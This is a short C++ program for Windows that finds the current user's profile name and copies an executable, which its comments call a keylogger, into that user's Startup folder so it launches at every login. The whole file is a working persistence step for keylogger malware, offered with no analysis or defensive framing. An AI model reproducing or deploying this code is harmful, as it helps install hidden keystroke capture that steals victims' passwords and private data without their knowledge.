#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <shlobj.h>

std::string getUsername()
{
	char path[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path);
	std::string fullPath = path;
	std::string userName = std::filesystem::path(fullPath).filename().string();

	return userName;
}

int main()
{
	std::string userName = getUsername();

	std::wstring oldPath = L"D:\\NAME_OF_KEYLOGGER_FILE.exe"; //name of keylogger file
	std::wstring newPath = L"C:\\Users\\" + std::wstring(userName.begin(), userName.end())
	+ L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NAME_OF_KEYLOGGER_FILE.exe"; //name of keylogger file

	CopyFileW(oldPath.c_str(), newPath.c_str(), false);

	return 0;
}